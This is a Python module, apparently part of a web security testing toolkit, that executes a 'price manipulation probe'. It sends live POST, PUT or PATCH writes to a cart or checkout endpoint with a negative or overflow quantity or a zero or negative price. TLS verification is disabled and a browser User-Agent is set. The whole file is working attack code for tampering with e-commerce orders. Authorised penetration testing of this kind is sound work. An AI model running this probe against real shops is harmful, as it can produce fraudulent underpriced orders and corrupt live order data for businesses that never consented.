"""
Execution logic for price_manipulation_probe: sends one real write per
relevant tamper variant against a cart/checkout/order endpoint (negative
or overflow quantity, zero or negative price). Each call is a genuine
write against live state -- hard-capped at MAX_VARIANTS variants per
call, mirroring mass_assignment_probe's exact shape. No parsing here --
that's parse.py's job.
"""
from __future__ import annotations

import json
from dataclasses import dataclass, field
from typing import Dict, List, Optional

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    requests = None

DEFAULT_TIMEOUT = 10
MAX_VARIANTS = 4

QUANTITY_VARIANTS = (("quantity_negative", -1), ("quantity_overflow", 999999999))
PRICE_VARIANTS = (("price_zero", 0), ("price_negative", -1))


@dataclass
class RawPriceManipulationAttempt:
    variant: str
    param: str
    injected_value: object
    status_code: int = 0
    body: str = ""
    error: Optional[str] = None


@dataclass
class RawPriceManipulationResult:
    target: str = ""
    method: str = ""
    baseline_body: Dict = field(default_factory=dict)
    attempts: List[RawPriceManipulationAttempt] = field(default_factory=list)
    error: Optional[str] = None


def parse_custom_headers(headers_str: Optional[str]) -> Dict[str, str]:
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Tradecraft/1.0",
        "Content-Type": "application/json",
    }
    if headers_str:
        for line in headers_str.splitlines():
            line = line.strip()
            if not line or ":" not in line:
                continue
            k, _, v = line.partition(":")
            headers[k.strip()] = v.strip()
    return headers


def execute(
    target: str,
    body: str,
    method: str = "POST",
    price_param: Optional[str] = None,
    quantity_param: Optional[str] = None,
    headers: Optional[str] = None,
    timeout: int = DEFAULT_TIMEOUT,
) -> RawPriceManipulationResult:
    if requests is None:
        return RawPriceManipulationResult(target=target, error="requests library not available")

    if not price_param and not quantity_param:
        return RawPriceManipulationResult(target=target, error="at least one of price_param/quantity_param is required")

    try:
        baseline_body = json.loads(body) if body else {}
        if not isinstance(baseline_body, dict):
            raise ValueError("body must decode to a JSON object")
    except Exception as exc:
        return RawPriceManipulationResult(target=target, error=f"invalid baseline 'body' JSON: {exc}")

    http_method = (method or "POST").upper()
    if http_method not in ("POST", "PUT", "PATCH"):
        return RawPriceManipulationResult(target=target, error=f"unsupported method '{method}' (use POST/PUT/PATCH)")

    variants: List[tuple] = []
    if quantity_param:
        variants.extend((name, quantity_param, value) for name, value in QUANTITY_VARIANTS)
    if price_param:
        variants.extend((name, price_param, value) for name, value in PRICE_VARIANTS)
    variants = variants[:MAX_VARIANTS]

    req_headers = parse_custom_headers(headers)
    attempts: List[RawPriceManipulationAttempt] = []
    for variant_name, param, value in variants:
        injected = dict(baseline_body)
        injected[param] = value
        try:
            resp = requests.request(
                http_method, target, json=injected, headers=req_headers,
                timeout=timeout, verify=False, allow_redirects=True,
            )
            attempts.append(RawPriceManipulationAttempt(
                variant=variant_name, param=param, injected_value=value,
                status_code=resp.status_code, body=(resp.text or "")[:5000],
            ))
        except requests.RequestException as exc:
            attempts.append(RawPriceManipulationAttempt(variant=variant_name, param=param, injected_value=value, error=str(exc)))
        except Exception as exc:
            attempts.append(RawPriceManipulationAttempt(
                variant=variant_name, param=param, injected_value=value, error=f"{type(exc).__name__}: {exc}",
            ))

    return RawPriceManipulationResult(target=target, method=http_method, baseline_body=baseline_body, attempts=attempts)
